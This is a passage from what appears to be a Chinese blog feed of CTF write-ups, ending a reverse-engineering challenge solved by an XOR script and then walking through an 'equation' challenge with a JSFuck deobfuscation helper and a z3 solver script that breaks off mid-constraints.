class="number">0x2C</span>,</span><br><span class="line">     <span class="number">0x88</span>, <span class="number">0x70</span>, <span class="number">0xF7</span>, <span class="number">0x4F</span>, <span class="number">0xAA</span>, <span class="number">0x7F</span>, <span class="number">0x12</span>, <span class="number">0x47</span>, <span class="number">0xD6</span>, <span class="number">0xDE</span>,</span><br><span class="line">     <span class="number">0x74</span>, <span class="number">0xB2</span>, <span class="number">0x1D</span>, <span class="number">0xA4</span>, <span class="number">0xD7</span>, <span class="number">0x76</span>, <span class="number">0x9A</span>, <span class="number">0xE0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) ^ S[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我这个脚本有点 bug，输出的结果前面会有一串乱码，但是结果是对的</p><p>得到<strong> flag {e10adc3949ba59abbe56e057f20f883e}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>equation</title>
      <link href="/2022/07/06/equation/"/>
      <url>/2022/07/06/equation/</url>
      
        <content type="html"><![CDATA[<p>拿到题目之后，有两个文件，一个.DS_Store 和一个 equation，然后上网查了一下.DS_Store 文件</p><p>DS_Store，英文全称是 Desktop Services Store（桌面服务存储），开头的 DS 是 Desktop Services（桌面服务） 的缩写。它是一种由 macOS 系统自动创建的隐藏文件，存在于每一个用「访达」打开过的文件夹下面</p><p>并没有什么用，用各种编辑器打开看了都没什么有用的信息，然后在看 equation.html，点开之后可以看到</p><img src="/2022/07/06/equation/1.png" class><p>虽然没学过 javascript，但很明显这里只要 if 的条件成立就正确，flag 就在其中，根据题目的提示，这是 fuck 加密，而且大概分析一下可以看出来，这是一个多元一次方程组，最后可以用 z3-solver 来解，现在就是要解密了，这个 jsfuck 加密可以在网上找到在线工具解密，但是每次都要把 l 括号里面的密文复制出来一个一个去解密，就很麻烦，所以就在网上找了个脚本一次性解了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deEquation</span>(<span class="params">str</span>) &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; i++) &#123;</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/l\[(\D*?)](\+l|-l|==)/g</span>, <span class="function">(<span class="params">m, a, b</span>) =&gt;</span> <span class="string">&#x27;l[&#x27;</span> + <span class="built_in">eval</span>(a) + <span class="string">&#x27;]&#x27;</span> + b);</span><br><span class="line">&#125;</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/==(\D*?)&amp;&amp;/g</span>, <span class="function">(<span class="params">m, a</span>) =&gt;</span> <span class="string">&#x27;==&#x27;</span> + <span class="built_in">eval</span>(a) + <span class="string">&#x27;&amp;&amp;&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line">js=<span class="string">&quot;&quot;</span><span class="comment">//将代码放入其中</span></span><br><span class="line">res=<span class="title function_">deEquation</span>(js);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(res);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用 notepad 保存之后拖到浏览器打开就可以运行出结果了，不过最后一个方程的结果没解出来，就用在线工具解一下，等于 81，最后把这些方程用 z3-solver 解一下 flag 就出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=Solver()</span><br><span class="line">l=IntVector(<span class="string">&#x27;l&#x27;</span>,<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line">s.add(l[<span class="number">40</span>]+l[<span class="number">35</span>]+l[<span class="number">34</span>]-l[<span class="number">0</span>]-l[<span class="number">15</span>]-l[<span class="number">37</span>]+l[<span class="number">7</span>]+l[<span class="number">6</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">19</span>]+l[<span class="number">8</span>]-l[<span class="number">17</span>]-l[<span class="number">14</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">9</span>]+l[<span class="number">22</span>]+l[<span class="number">41</span>]+l[<span class="number">3</span>]-l[<span class="number">29</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]+l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">30</span>]+l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">2</span>]+l[<span class="number">27</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">33</span>]-l[<span class="number">18</span>]+l[<span class="number">4</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">31</span>]+l[<span class="number">26</span>]+l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">27</span>]-l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">30</span>]+l[<span class="number">1</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]-l[<span class="number">41</span>]-l[<span class="number">14</span>]-l[<span class="number">19</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]-l[<span class="number">6</span>]-l[<span class="number">0</span>]-l[<span class="number">22</span>]-l[<span class="number">18</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]+l[<span class="number">34</span>]-l[<span class="number">21</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">8</span>]-l[<span class="number">40</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]==-<span class="number">448</span>)</span><br><span class="line">s.add(l[<span class="number">26</span>]+l[<span class="number">14</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]+l[<span class="number">13</span>]+l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">7</span>]+l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">25</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">35</span>]-l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">8</span>]+l[<span class="number">10</span>]-l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]+l[<span class="number">17</span>]+l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]+l[<span class="number">38</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]==<span class="number">1244</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">22</span>]+l[<span class="number">15</span>]+l[<span class="number">2</span>]-l[<span class="number">28</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]-l[<span class="number">18</span>]+l[<span class="number">30</span>]-l[<span class="number">9</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">34</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]+l[<span class="number">16</span>]-l[<span class="number">7</span>]+l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]-l[<span class="number">12</span>]-l[<span class="number">40</span>]-l[<span class="number">25</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">20</span>]-l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">33</span>]-l[<span class="number">21</span>]+l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]==-<span class="number">39</span>)</span><br><span class="line">s.add(l[<span class="number">41</span>]-l[<span class="number">29</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">20</span>]-l[<span class="number">33</span>]+l[<span class="number">35</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">26</span>]-l[<span class="number">24</span>]-l[<span class="number">17</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]-l[<span class="number">0</span>]-l[<span class="number">13</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]+l[<span class="number">14</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">40</span>]+l[<span class="number">34</span>]-l[<span class="number">38</span>]+l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">2</span>]+l[<span class="number">15</span>]+l[<span class="number">6</span>]+l[<span class="number">28</span>]-l[<span class="number">8</span>]-l[<span class="number">5</span>]-l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">27</span>]==<span class="number">485</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">2</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">39</span>]+l[<span class="number">31</span>]-l[<span class="number">23</span>]-l[<span class="number">41</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">20</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">6</span>]-l[<span class="number">16</span>]-l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">22</span>]-l[<span class="number">25</span>]-l[<span class="number">34</span>]-l[<span class="number">17</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]==-<span class="number">1068</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">13</span>]+l[<span class="number">24</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">1</span>]+l[<span class="number">39</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">25</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">17</span>]+l[<span class="number">10</span>]+l[<span class="number">40</span>]+l[<span class="number">34</span>]+l[<span class="number">27</span>]-l[<span class="number">20</span>]+l[<span class="number">23</span>]+l[<span class="number">31</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">30</span>]+l[<span class="number">29</span>]-l[<span class="number">4</span>]==<span class="number">939</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]+l[<span class="number">11</span>]+l[<span class="number">20</span>]-l[<span class="number">16</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">31</span>]+l[<span class="number">28</span>]-l[<span class="number">23</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">27</span>]+l[<span class="number">35</span>]+l[<span class="number">39</span>]-l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">22</span>]+l[<span class="number">5</span>]-l[<span class="number">6</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]+l[<span class="number">24</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">38</span>]+l[<span class="number">15</span>]-l[<span class="number">2</span>]+l[<span class="number">30</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">3</span>]-l[<span class="number">17</span>]+l[<span class="number">34</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">26</span>]==<span class="number">413</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]+l[<span class="number">4</span>]-l[<span class="number">9</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]+l[<span class="number">17</span>]+l[<span class="number">3</span>]-l[<span class="number">24</span>]+l[<span class="number">38</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]-l[<span class="number">31</span>]-l[<span class="number">0</span>]-l[<span class="number">25</span>]+l[<span class="number">33</span>]+l[<span class="number">15</span>]-l[<span class="number">1</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]-l[<span class="number">29</span>]-l[<span class="number">12</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]-l[<span class="number">6</span>]-l[<span class="number">40</span>]-l[<span class="number">13</span>]+l[<span class="number">8</span>]+l[<span class="number">37</span>]+l[<span class="number">19</span>]+l[<span class="number">14</span>]+l[<span class="number">32</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]+l[<span class="number">7</span>]==<span class="number">117</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">16</span>]+l[<span class="number">3</span>]+l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]-l[<span class="number">40</span>]-l[<span class="number">4</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]-l[<span class="number">27</span>]+l[<span class="number">13</span>]-l[<span class="number">19</span>]-l[<span class="number">12</span>]+l[<span class="number">23</span>]-l[<span class="number">39</span>]-l[<span class="number">41</span>]-l[<span class="number">8</span>]+l[<span class="number">22</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">9</span>]-l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]-l[<span class="number">7</span>]+l[<span class="number">35</span>]-l[<span class="number">0</span>]==-<span class="number">313</span>)</span><br><span class="line">s.add(l[<span class="number">40</span>]-l[<span class="number">1</span>]+l[<span class="number">5</span>]+l[<span class="number">7</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">38</span>]-l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]-l[<span class="number">35</span>]-l[<span class="number">8</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]-l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">10</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">16</span>]+l[<span class="number">6</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]-l[<span class="number">30</span>]+l[<span class="number">37</span>]-l[<span class="number">19</span>]+l[<span class="number">21</span>]+l[<span class="number">25</span>]-l[<span class="number">15</span>]==-<span class="number">42</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]+l[<span class="number">26</span>]-l[<span class="number">17</span>]-l[<span class="number">25</span>]+l[<span class="number">27</span>]-l[<span class="number">22</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">15</span>]-l[<span class="number">20</span>]-l[<span class="number">32</span>]+l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]+l[<span class="number">28</span>]+l[<span class="number">31</span>]+l[<span class="number">13</span>]-l[<span class="number">16</span>]-l[<span class="number">37</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]+l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">1</span>]+l[<span class="number">11</span>]+l[<span class="number">24</span>]+l[<span class="number">18</span>]-l[<span class="number">40</span>]+l[<span class="number">19</span>]-l[<span class="number">35</span>]+l[<span class="number">2</span>]-l[<span class="number">38</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]+l[<span class="number">4</span>]+l[<span class="number">0</span>]-l[<span class="number">33</span>]==<span class="number">289</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">31</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]-l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">35</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]-l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">24</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">18</span>]-l[<span class="number">0</span>]+l[<span class="number">12</span>]+l[<span class="number">11</span>]-l[<span class="number">38</span>]+l[<span class="number">6</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">25</span>]-l[<span class="number">10</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]+l[<span class="number">30</span>]-l[<span class="number">16</span>]+l[<span class="number">28</span>]-l[<span class="number">26</span>]==-<span class="number">117</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">0</span>]-l[<span class="number">27</span>]+l[<span class="number">12</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">38</span>]+l[<span class="number">9</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]+l[<span class="number">6</span>]-l[<span class="number">25</span>]-l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">14</span>]-l[<span class="number">1</span>]+l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">19</span>]-l[<span class="number">4</span>]-l[<span class="number">7</span>]+l[<span class="number">26</span>]+l[<span class="number">30</span>]-l[<span class="number">10</span>]+l[<span class="number">13</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">23</span>]-l[<span class="number">3</span>]-l[<span class="number">33</span>]==-<span class="number">252</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]-l[<span class="number">9</span>]+l[<span class="number">12</span>]-l[<span class="number">28</span>]+l[<span class="number">11</span>]+l[<span class="number">40</span>]-l[<span class="number">27</span>]-l[<span class="number">8</span>]+l[<span class="number">32</span>]-l[<span class="number">25</span>]-l[<span class="number">23</span>]+l[<span class="number">39</span>]-l[<span class="number">1</span>]-l[<span class="number">36</span>]-l[<span class="number">15</span>]+l[<span class="number">33</span>]-l[<span class="number">20</span>]+l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">34</span>]-l[<span class="number">21</span>]+l[<span class="number">19</span>]+l[<span class="number">26</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]+l[<span class="number">7</span>]-l[<span class="number">37</span>]+l[<span class="number">38</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">0</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]==-<span class="number">183</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">8</span>]-l[<span class="number">20</span>]+l[<span class="number">34</span>]-l[<span class="number">33</span>]-l[<span class="number">25</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]-l[<span class="number">13</span>]-l[<span class="number">15</span>]-l[<span class="number">40</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">28</span>]-l[<span class="number">35</span>]+l[<span class="number">38</span>]-l[<span class="number">22</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">5</span>]+l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">23</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">10</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]+l[<span class="number">31</span>]==<span class="number">188</span>)</span><br><span class="line">s.add(l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">10</span>]+l[<span class="number">39</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]+l[<span class="number">24</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">27</span>]-l[<span class="number">38</span>]+l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">28</span>]+l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]-l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">34</span>]+l[<span class="number">20</span>]-l[<span class="number">22</span>]-l[<span class="number">16</span>]+l[<span class="number">19</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">7</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]-l[<span class="number">4</span>]+l[<span class="number">35</span>]==<span class="number">1036</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]-l[<span class="number">33</span>]+l[<span class="number">2</span>]+l[<span class="number">37</span>]-l[<span class="number">12</span>]-l[<span class="number">9</span>]-l[<span class="number">39</span>]+l[<span class="number">16</span>]-l[<span class="number">32</span>]+l[<span class="number">8</span>]-l[<span class="number">36</span>]+l[<span class="number">31</span>]+l[<span class="number">10</span>]-l[<span class="number">4</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">18</span>]+l[<span class="number">24</span>]-l[<span class="number">0</span>]+l[<span class="number">29</span>]-l[<span class="number">26</span>]+l[<span class="number">35</span>]-l[<span class="number">22</span>]-l[<span class="number">41</span>]-l[<span class="number">6</span>]+l[<span class="number">15</span>]+l[<span class="number">19</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]+l[<span class="number">5</span>]+l[<span class="number">23</span>]+l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]==<span class="number">328</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]-l[<span class="number">32</span>]+l[<span class="number">17</span>]-l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">34</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]-l[<span class="number">35</span>]-l[<span class="number">38</span>]+l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]-l[<span class="number">37</span>]+l[<span class="number">28</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">12</span>]+l[<span class="number">7</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">24</span>]-l[<span class="number">25</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]-l[<span class="number">19</span>]-l[<span class="number">39</span>]-l[<span class="number">14</span>]-l[<span class="number">31</span>]+l[<span class="number">10</span>]==-<span class="number">196</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">13</span>]+l[<span class="number">14</span>]-l[<span class="number">15</span>]-l[<span class="number">29</span>]-l[<span class="number">2</span>]+l[<span class="number">7</span>]+l[<span class="number">20</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">33</span>]-l[<span class="number">19</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]-l[<span class="number">39</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">38</span>]+l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">23</span>]-l[<span class="number">26</span>]+l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">27</span>]+l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">10</span>]+l[<span class="number">25</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">18</span>]+l[<span class="number">32</span>]==<span class="number">7</span>)</span><br><span class="line">s.add(l[<span class="number">34</span>]-l[<span class="number">37</span>]-l[<span class="number">40</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]-l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span class="number">38</span>]+l[<span class="number">13</span>]-l[<span class="number">28</span>]+l[<span class="number">8</span>]+l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">26</span>]+l[<span class="number">1</span>]-l[<span class="number">18</span>]+l[<span class="number">5</span>]+l[<span class="number">35</span>]-l[<span class="number">24</span>]-l[<span class="number">41</span>]+l[<span class="number">9</span>]-l[<span class="number">0</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]-l[<span class="number">10</span>]+l[<span class="number">12</span>]-l[<span class="number">36</span>]+l[<span class="number">33</span>]-l[<span class="number">16</span>]-l[<span class="number">14</span>]-l[<span class="number">25</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]+l[<span class="number">27</span>]+l[<span class="number">3</span>]-l[<span class="number">17</span>]==-<span class="number">945</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">30</span>]-l[<span class="number">8</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">7</span>]-l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">4</span>]-l[<span class="number">23</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]+l[<span class="number">39</span>]-l[<span class="number">32</span>]+l[<span class="number">27</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">40</span>]+l[<span class="number">29</span>]-l[<span class="number">6</span>]+l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]+l[<span 